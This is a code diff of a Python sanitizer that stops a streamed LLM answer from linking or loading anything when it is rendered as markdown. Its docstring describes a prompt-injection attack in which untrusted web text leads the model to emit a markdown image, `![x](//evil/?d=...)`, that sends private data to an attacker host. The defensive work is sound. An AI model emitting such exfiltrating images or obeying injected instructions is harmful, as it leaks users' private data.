@@ -1,25 +1,25 @@
-"""Strip links, images, URLs and HTML from a streamed LLM answer.
+"""Make a streamed LLM answer unable to load or link anything when rendered as markdown.
 
-Used where the prompt mixes private data with untrusted web text: a prompt-injected
-`![x](https://evil/?d=...)` would otherwise make the browser send that data out when the
-markdown renders. Works across chunk boundaries by holding back a possibly-unfinished tail.
+Used where the prompt mixes private data with untrusted web text: a prompt-injected image
+(`![x](//evil/?d=...)`, or the reference form `![x][r]` + `[r]: ...`) would make the browser send that
+data out. Rather than blocklisting markdown syntax, the characters links and images need are removed:
+square brackets go, and `://` / `www.` are broken so nothing autolinks. Raw HTML needs no handling
+because the chat renderer doesn't render it. Every rule is a fixed-width text rewrite, so streaming
+only holds back the last few characters in case a pattern spans two chunks.
 """
 
 import re
 
-_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
-_LINK = re.compile(r"\[([^\]]*)\]\([^)]*\)")
-_TAG = re.compile(r"<[^>\n]*>")
-_URL = re.compile(r"(?:https?://|www\.)\S+", re.IGNORECASE)
-# A stray "[" or "<" must not hold the whole answer back.
-MAX_HOLD = 400
+_WWW = re.compile(r"www\.", re.IGNORECASE)
+# Longest pattern ("www.") minus one: enough tail to finish a pattern split across chunks.
+HOLD = 3
 
 
 def sanitize(text: str) -> str:
-    text = _IMAGE.sub("", text)
-    text = _LINK.sub(r"\1", text)
-    text = _TAG.sub("", text)
-    return _URL.sub("", text)
+    """Idempotent: sanitizing already-sanitized text changes nothing."""
+    text = text.replace("[", "").replace("]", "")
+    text = text.replace("://", ": ")
+    return _WWW.sub("www ", text)
 
 
 class AnswerSanitizer:
@@ -27,29 +27,11 @@ class AnswerSanitizer:
         self._buffer = ""
 
     def feed(self, chunk: str) -> str:
-        """Sanitized text that is safe to emit now; the rest waits for more input."""
-        self._buffer += chunk
-        cut = self._safe_cut(self._buffer)
-        ready, self._buffer = self._buffer[:cut], self._buffer[cut:]
-        return sanitize(ready)
+        """Sanitized text that is safe to emit now; the last few characters wait for more input."""
+        self._buffer = sanitize(self._buffer + chunk)
+        ready, self._buffer = self._buffer[:-HOLD], self._buffer[-HOLD:]
+        return ready
 
     def flush(self) -> str:
         rest, self._buffer = self._buffer, ""
         return sanitize(rest)
-
-    @staticmethod
-    def _safe_cut(text: str) -> int:
-        cut = len(text)
-        # Unclosed "[...](...)" (maybe "![") or "<...>" could still become a link/image/tag.
-        bracket = text.rfind("[")
-        if bracket != -1 and ")" not in text[bracket:]:
-            cut = min(cut, bracket - 1 if bracket > 0 and text[bracket - 1] == "!" else bracket)
-        angle = text.rfind("<")
-        if angle != -1 and ">" not in text[angle:]:
-            cut = min(cut, angle)
-        # The last word may be the start of a URL.
-        if text and not text[-1].isspace():
-            cut = min(cut, max(text.rfind(" "), text.rfind("\n")) + 1)
-        if len(text) - cut > MAX_HOLD:
-            cut = len(text) - MAX_HOLD
-        return cut
